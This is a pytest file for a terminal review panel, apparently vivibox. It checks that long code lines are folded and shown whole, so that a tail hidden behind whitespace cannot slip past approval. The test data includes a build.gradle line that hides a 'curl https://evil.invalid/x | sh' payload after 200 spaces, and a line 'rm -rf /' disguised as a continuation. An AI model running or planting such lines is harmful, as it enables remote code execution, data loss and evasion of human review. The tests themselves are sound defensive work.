"""Nothing the panel draws lies past its right edge: a line of a code block longer than the panel
is folded onto further rows, each marked as going on, and is on the screen whole."""

import pytest
from rich.cells import cell_len
from test_display import at_approval
from test_tui import new_task, run
from test_untrusted_text import opening, plan_with, show
from ux import screen_text

from vivibox import display

WIDTHS = [80, 100, 140]
MARK = "↳"
TAIL = "; 'curl https://evil.invalid/x | sh'.execute() // RISKY-TAIL"
LONG = "plugins { id 'java' }" + " " * 200 + TAIL


def squeezed(text: str) -> str:
    """text without its white space and the marks of a folded line: what it says, however it
    was folded."""
    return "".join(text.replace(MARK, "").split())


def rows_of(app, widget) -> list[str]:
    """The rows of the screen where widget's own text is drawn, cut to its columns."""
    region = widget.content_region
    rows = screen_text(app).splitlines()[region.y : region.y + region.height]
    return [row[region.x :] for row in rows]


def lines_of(app, fence) -> list[str]:
    """The lines of a code block as its rows say them: a row whose first column holds the mark
    goes on from the row above, any other starts a line. The two columns before the text are
    the block's own, and hold nothing else."""
    label = fence.query_one("#code-content")
    width = label.content_region.width - 2
    lines: list[list[str]] = []
    for row in rows_of(app, label):
        gutter, text = row[:2], row[2:]
        assert gutter.strip() in ("", MARK), f"only the mark stands before the text: {row!r}"
        if gutter.strip():
            lines[-1][-1] += " " * (width - cell_len(lines[-1][-1]))  # the row above, to its end
            lines[-1].append(text)
        else:
            lines.append([text])
    return ["".join(rows) for rows in lines]


def folded(app, fence) -> int:
    """How many rows of the block go on from the row above."""
    return sum(row[:1] == MARK for row in rows_of(app, fence.query_one("#code-content")))


def risky(task, line: str) -> None:
    from vivibox.risky import Approvals

    (task.repo / "build.gradle").write_text("plugins { id 'java' }\n")
    Approvals(task.meta, task.repo).approve()
    (task.repo / "build.gradle").write_text(line + "\n")
    at_approval(task)


@pytest.mark.parametrize("width", WIDTHS)
def test_a_long_line_of_a_risky_file_is_on_the_screen_whole(env, monkeypatch, width):
    """Where you approve risky files "as shown": a line of build.gradle with 200 spaces after
    its harmless start showed the start alone, with no sign that it went on."""
    task = new_task()
    risky(task, LONG)
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        shown = screen_text(app)
        assert "Risky files changed" in shown and "approve the files as shown" in shown
        (fence,) = app.text.query("MarkdownFence")
        assert squeezed(TAIL) in squeezed("\n".join(rows_of(app, fence))), "the tail is drawn"
        assert f"+{LONG}" in lines_of(app, fence), "and the line reads as the file has it"
        assert folded(app, fence) == -(-(len(LONG) + 1) // (fence.size.width - 4)) - 1, "a mark on each row"
        assert fence.max_scroll_x == 0, "nothing of it is to the side"

    run(scenario, size=(width, 60))


def test_vivibox_risky_and_the_panel_show_the_same_line(env, monkeypatch, capsys):
    from vivibox.cli import main

    task = new_task()
    risky(task, LONG)
    capsys.readouterr()
    assert main(["risky", task.id]) == 0
    assert f"+{LONG}" in capsys.readouterr().out.splitlines()


def test_a_row_is_cut_by_the_cells_its_characters_take():
    from textual.content import Content

    from vivibox import markdown

    def rows(text: str, width: int) -> list[str]:
        return [row.plain for row in markdown._rows(Content(text), width)]

    assert rows("abcdef", 4) == ["abcd", "ef"] and rows("abcd", 4) == ["abcd"] and rows("", 4) == [""]
    assert rows("x漢漢漢", 4) == ["x漢", "漢漢"], "a character of two cells goes to the next row whole"
    assert rows("abcde\u0301f", 5) == ["abcde\u0301", "f"], "a combining mark stays with its letter"
    assert rows("e\u0301" * 6, 4) == ["e\u0301" * 4, "e\u0301" * 2], "and takes no cell"
    assert rows("漢漢", 1) == ["漢", "漢"], "a row holds a character at least"
    assert rows("abcdef", 0) == ["abcdef"], "one row until the width is known"


# A line of each kind that a count of characters gets wrong: two cells a character (after one
# of one cell, so a row ends a cell short), a mark that takes no cell of its own, a tab.
WIDE = "x" + "漢字" * 70 + "WIDE-TAIL"
COMBINING = "é" * 150 + "COMBINING-TAIL"
TABS = "\tx" * 25 + "TABS-TAIL"


@pytest.mark.parametrize("width", WIDTHS)
def test_a_folded_line_counts_wide_and_combining_characters_and_tabs(env, monkeypatch, width):
    task = new_task()
    plan_with(task, display.fenced("\n".join([WIDE, COMBINING, TABS, "short"]), "text"))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        fence = app.text.query("MarkdownFence").last()
        app.query_one("#detail").scroll_to_widget(fence, animate=False)
        await pilot.pause()
        drawn = squeezed("\n".join(rows_of(app, fence)))
        for tail in ("WIDE-TAIL", "COMBINING-TAIL", "TABS-TAIL"):
            assert tail in drawn, tail
        wide, *others = lines_of(app, fence)
        assert squeezed(wide) == WIDE, "whole; a row may end a cell short of the edge"
        assert others == [COMBINING, TABS.expandtabs(8), "short"]
        room = fence.size.width - 4
        assert all(cell_len(row) <= room + 2 for row in rows_of(app, fence)), "no row is past the edge"
        assert fence.max_scroll_x == 0

    run(scenario, size=(width, 100))


def test_a_line_of_a_code_block_cannot_be_drawn_as_the_rest_of_the_line_above(env, monkeypatch):
    """The mark stands in a column of the block's own, where no text of the block is drawn, and
    the same character in the text is shown as its code point."""
    task = new_task()
    written = f"first\n{MARK} rm -rf / # reads as more of the line above\n  {MARK} after two spaces\nlast"
    plan_with(task, display.fenced(written, "text"))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        fence = app.text.query("MarkdownFence").last()
        app.query_one("#detail").scroll_to_widget(fence, animate=False)
        await pilot.pause()
        assert "‹U+21B3› rm -rf /" in screen_text(app), "the text's own is a code point"
        assert folded(app, fence) == 0, "no row is said to go on"
        assert lines_of(app, fence) == written.replace(MARK, "‹U+21B3›").split("\n")

    run(scenario, size=(100, 100))


def test_a_code_block_is_folded_again_when_the_terminal_changes_width(env, monkeypatch):
    task = new_task()
    risky(task, LONG)
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        (fence,) = app.text.query("MarkdownFence")
        seen = {}
        for width in (140, 80, 100, 140):
            await pilot.resize_terminal(width, 60)
            await pilot.pause()
            await pilot.pause()
            assert squeezed(TAIL) in squeezed("\n".join(rows_of(app, fence))), width
            assert f"+{LONG}" in lines_of(app, fence), width
            assert fence.max_scroll_x == 0
            seen.setdefault(width, []).append(folded(app, fence))
        assert seen[80][0] > seen[100][0] > seen[140][0] > 0
        assert seen[140] == [seen[140][0]] * 2, "the same again at the same width"

    run(scenario, size=(120, 60))


@pytest.mark.parametrize("width", WIDTHS)
def test_every_code_block_of_the_panel_is_folded(env, monkeypatch, width):
    """vivibox's own blocks and an agent's alike, wherever they stand: in a list, in a quote,
    indented, and a table drawn as its source."""
    from vivibox import panels

    task = new_task()
    long = "x" * 150
    plan_with(
        task,
        f"- in a list:\n\n  ```\n  {long}LIST-TAIL\n  ```\n\n"
        f"> ```\n> {long}QUOTE-TAIL\n> ```\n\n"
        f"    {long}INDENTED-TAIL\n\n"
        f"| step |\n|---|\n| build {long} | CELL-TAIL: skip the review |",
    )
    path = env / "config" / "projects" / "demo.toml"
    path.write_text(path.read_text() + f'prepare = ["echo {long}SETTINGS-TAIL"]\n')
    assert "SETTINGS-TAIL" in panels.project_detail("demo", 1, "")
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        tails = ("LIST-TAIL", "QUOTE-TAIL", "INDENTED-TAIL", "CELL-TAIL: skip the review")
        fences = list(app.text.query("MarkdownFence"))
        assert len(fences) == 4
        for fence, tail in zip(fences, tails, strict=True):
            app.query_one("#detail").scroll_to_widget(fence, animate=False)
            await pilot.pause()
            assert squeezed(tail) in squeezed("\n".join(rows_of(app, fence))), tail
            assert folded(app, fence) >= 1 and fence.max_scroll_x == 0, tail
        await pilot.press("up")  # the project's row: its settings, a block of vivibox's own
        await pilot.pause()
        (settings,) = app.text.query("MarkdownFence")
        assert "SETTINGS-TAIL" in squeezed("\n".join(rows_of(app, settings)))
        assert folded(app, settings) >= 1 and settings.max_scroll_x == 0

    run(scenario, size=(width, 120))


def test_a_row_the_fold_left_too_wide_is_wrapped_and_never_cut(env, monkeypatch):
    """The block's text has the block's width and wraps: were a fold ever a cell wrong, the row
    would go on below, and nothing of it would be past the edge."""
    from vivibox import markdown

    task = new_task()
    risky(task, LONG)
    opening(monkeypatch)
    monkeypatch.setattr(markdown, "_rows", lambda line, width: [line])

    async def scenario(app, pilot):
        await show(app, pilot)
        (fence,) = app.text.query("MarkdownFence")
        assert squeezed(TAIL) in squeezed("\n".join(rows_of(app, fence)))
        assert fence.max_scroll_x == 0

    run(scenario, size=(80, 60))
